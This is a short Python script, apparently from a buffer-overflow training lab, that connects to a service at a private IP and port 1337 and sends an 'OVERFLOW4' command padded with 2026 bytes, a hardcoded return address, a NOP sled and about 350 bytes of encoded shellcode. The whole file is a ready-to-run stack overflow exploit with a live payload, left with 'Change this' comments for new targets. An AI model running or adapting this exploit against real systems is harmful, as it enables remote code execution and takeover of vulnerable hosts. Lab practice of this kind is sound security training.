import socket

ip = "10.10.73.40" # Change this
port = 1337 # Change this

prefix = "OVERFLOW4 " # Change this
offset = 2026
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = (
"\xbb\x92\x29\xac\x4f\xd9\xec\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x83\xc0\x04\x31\x58\x0e\x03\xca\x27\x4e\xba\x16\xdf\x0c"
"\x45\xe6\x20\x71\xcf\x03\x11\xb1\xab\x40\x02\x01\xbf\x04\xaf"
"\xea\xed\xbc\x24\x9e\x39\xb3\x8d\x15\x1c\xfa\x0e\x05\x5c\x9d"
"\x8c\x54\xb1\x7d\xac\x96\xc4\x7c\xe9\xcb\x25\x2c\xa2\x80\x98"
"\xc0\xc7\xdd\x20\x6b\x9b\xf0\x20\x88\x6c\xf2\x01\x1f\xe6\xad"
"\x81\x9e\x2b\xc6\x8b\xb8\x28\xe3\x42\x33\x9a\x9f\x54\x95\xd2"
"\x60\xfa\xd8\xda\x92\x02\x1d\xdc\x4c\x71\x57\x1e\xf0\x82\xac"
"\x5c\x2e\x06\x36\xc6\xa5\xb0\x92\xf6\x6a\x26\x51\xf4\xc7\x2c"
"\x3d\x19\xd9\xe1\x36\x25\x52\x04\x98\xaf\x20\x23\x3c\xeb\xf3"
"\x4a\x65\x51\x55\x72\x75\x3a\x0a\xd6\xfe\xd7\x5f\x6b\x5d\xb0"
"\xac\x46\x5d\x40\xbb\xd1\x2e\x72\x64\x4a\xb8\x3e\xed\x54\x3f"
"\x40\xc4\x21\xaf\xbf\xe7\x51\xe6\x7b\xb3\x01\x90\xaa\xbc\xc9"
"\x60\x52\x69\x5d\x30\xfc\xc2\x1e\xe0\xbc\xb2\xf6\xea\x32\xec"
"\xe7\x15\x99\x85\x82\xec\x4a\xa0\x5b\xeb\xdb\xdc\x59\xf3\xca"
"\x40\xd7\x15\x86\x68\xb1\x8e\x3f\x10\x98\x44\xa1\xdd\x36\x21"
"\xe1\x56\xb5\xd6\xac\x9e\xb0\xc4\x59\x6f\x8f\xb6\xcc\x70\x25"
"\xde\x93\xe3\xa2\x1e\xdd\x1f\x7d\x49\x8a\xee\x74\x1f\x26\x48"
"\x2f\x3d\xbb\x0c\x08\x85\x60\xed\x97\x04\xe4\x49\xbc\x16\x30"
"\x51\xf8\x42\xec\x04\x56\x3c\x4a\xff\x18\x96\x04\xac\xf2\x7e"
"\xd0\x9e\xc4\xf8\xdd\xca\xb2\xe4\x6c\xa3\x82\x1b\x40\x23\x03"
"\x64\xbc\xd3\xec\xbf\x04\xf3\x0e\x15\x71\x9c\x96\xfc\x38\xc1"
"\x28\x2b\x7e\xfc\xaa\xd9\xff\xfb\xb3\xa8\xfa\x40\x74\x41\x77"
"\xd8\x11\x65\x24\xd9\x33"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")